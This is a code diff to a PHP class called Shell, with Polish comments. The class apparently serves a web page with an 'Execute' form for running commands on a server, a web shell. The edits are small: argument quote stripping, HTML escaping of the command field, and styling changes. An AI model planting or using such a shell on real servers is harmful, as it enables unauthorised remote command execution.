@@ -156,7 +156,7 @@ class Shell
 		/**
 		 * SafeMode
 		 */
-		$this -> bSafeMode = (bool) ini_get( 'safe_mode' );
+		$this -> bSafeMode = (boolean) ini_get( 'safe_mode' );
 
 		/**
 		 * Jesli SafeMode jest wylaczony
@@ -470,10 +470,11 @@ DATA;
 			$sOutput .= str_pad( $sModuleCmd, $iMaxLen, ' ' ) . ' - ' . trim( substr( $sHelp, 0, $iPos ) ) . "\r\n";
 		}
 
+		$sOutput .= "\r\n\r\n";
+
 		/**
 		 * Wyswietlanie naglowka
 		 */
-		$sOutput .= "\r\n\r\n";
 		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
 		{
 			$oModule = new $sModule( $this );
@@ -535,14 +536,14 @@ DATA;
 		{
 			if( ( $iPos = strpos( $sCmd, ' ' ) - 1 ) !== -1 )
 			{
-				$this -> sCmd = (string) substr( $sCmd, 1, $iPos );
+				$this -> sCmd = substr( $sCmd, 1, $iPos );
 			}
 			else
 			{
 				$this -> sCmd = (string) substr( $sCmd, 1 );
 			}
 
-			$this -> sArgv = ltrim( preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd ) );
+			$this -> sArgv = $this -> rmQuotes( ltrim( preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd ) ) );
 
 			/**
 			 * Rozdzielanie argumentow
@@ -660,12 +661,12 @@ DATA;
 
 		if( $bRaw || ( PHP_SAPI === 'cli' ) )
 		{
-			return strip_tags( $sConsole );
+			return strip_tags( $sConsole ) . "\r\n";
 		}
 
 		$sContent  = sprintf( '<pre id="console">%s</pre><div>', $sConsole ) .
 		             sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
-		             sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : $sCmd ) ) .
+		             sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : $sCmd ) ) ) .
 			     '<input type="submit" name="submit" value="Execute" id="cmd-send" /></form></div>';
 
 		return $this -> getContent( $sContent );
@@ -688,8 +689,8 @@ DATA;
 return <<<DATA
 <!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset="utf-8"><style>
 body{background-color:#eff;color:#000;font-size:12px;font-family:sans-serif,Verdana,Tahoma,Arial;margin:10px;padding:0;}
-a{color:#226c90;text-decoration:none;}
-a:hover{color:#5a9cbb;text-decoration:underline;}
+a{color:#269;text-decoration:none;}
+a:hover{color:#59b;text-decoration:underline;}
 h1,h2,h3,h4,h5,h6{margin-top:10px;padding-bottom:5px;color:#046;border-bottom:1px solid #ddd;}
 table{background-color:#fff;border:1px solid #eef;border-radius:20px;-moz-border-radius:20px;margin:auto;padding:6px;}
 td{background-color:#f8f8f8;border-radius:5px;-moz-border-radius:5px;margin:0;padding:0 0 0 4px;}
@@ -704,18 +705,14 @@ input{border-radius:10px;-moz-border-radius:10px;border:1px solid #aaa;backgroun
 input:hover{background-color:#eee;}
 input#cmd{width:88%;margin-top:10px;padding-left:10px;}
 input#cmd-send{margin-top:10px;margin-left:20px;}
-.green{color:#55b855;font-weight:700;}
-.red{color:#fb5555;font-weight:700;}
-</style>
-</head>
-<body>
+.green{color:#5b5;font-weight:700;}
+.red{color:#b55;font-weight:700;}
+</style></head><body>
 <div id="body">
 <div id="menu">{$sMenu}</div>
 <div id="content">{$sData}</div>
-<div id="bottom">Strona wygenerowana w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>
-</div>
-</body>
-</html>
+<div id="bottom">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>
+</div></body></html>
 DATA;
 	}
 
@@ -755,6 +752,25 @@ DATA;
 		{
 			$sVar = substr( $sVar, 1, -1 );
 		}
+	}
+
+	/**
+	 * Usuwanie poczakowego oraz koncowego znaku " / '
+	 *
+	 * @access private
+	 * @param  string $sVal Ciag znakow
+	 * @return string
+	 */
+	private function rmQuotes( $sVal )
+	{
+		if(    ( ( substr( $sVal, 0, 1 ) === '"' ) && ( substr( $sVal, -1 ) === '"' ) )
+		    || ( ( substr( $sVal, 0, 1 ) === '\'' ) && ( substr( $sVal, -1 ) === '\'' ) )
+		)
+		{
+			return substr( $sVal, 1, -1 );
+		}
+
+		return $sVal;
 	}
 
 }
